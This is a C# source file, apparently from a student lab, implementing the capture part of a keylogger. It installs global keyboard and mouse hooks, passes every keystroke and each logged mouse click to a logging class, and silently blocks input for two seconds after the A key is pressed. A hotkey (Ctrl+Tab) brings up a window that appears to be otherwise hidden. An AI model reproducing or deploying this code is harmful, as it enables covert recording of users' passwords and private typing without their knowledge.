using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;
using System.Globalization;
using System.Runtime.InteropServices;
using System;

namespace Lab8
{
    public class EventManager
    {
        public delegate void WindowShowHandler();

        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly LogManager _logManager;
        private readonly Settings _settings;
        private readonly WindowShowHandler _windowShow;
        private int a_key_pressed;

        

        public EventManager(Settings config, WindowShowHandler windowShow)
        {
            _settings = config;
            _windowShow = windowShow;
            _logManager = new LogManager(_settings);
            _globalHooks.KeyDown += KeyEvent;
            _globalHooks.MouseClick += MouseEvent;
        }

        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.A)
            {
                a_key_pressed = (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
                e.Handled = true;
            }
            int cur_time = (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
            if (cur_time - a_key_pressed <= 2)
            {
                e.Handled = true;
            }
            _logManager.KeyLogManager(e.KeyData.ToString());
            if (e.KeyData == (Keys.Control | Keys.Tab))
            {
                if (_windowShow != null)
                {
                    _windowShow.Invoke();
                }
            }
        }

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (_settings.IsLog)
            {
                _logManager.MouseLogManager(e.Button.ToString(), e.Location.ToString());
            }
        }
    }
}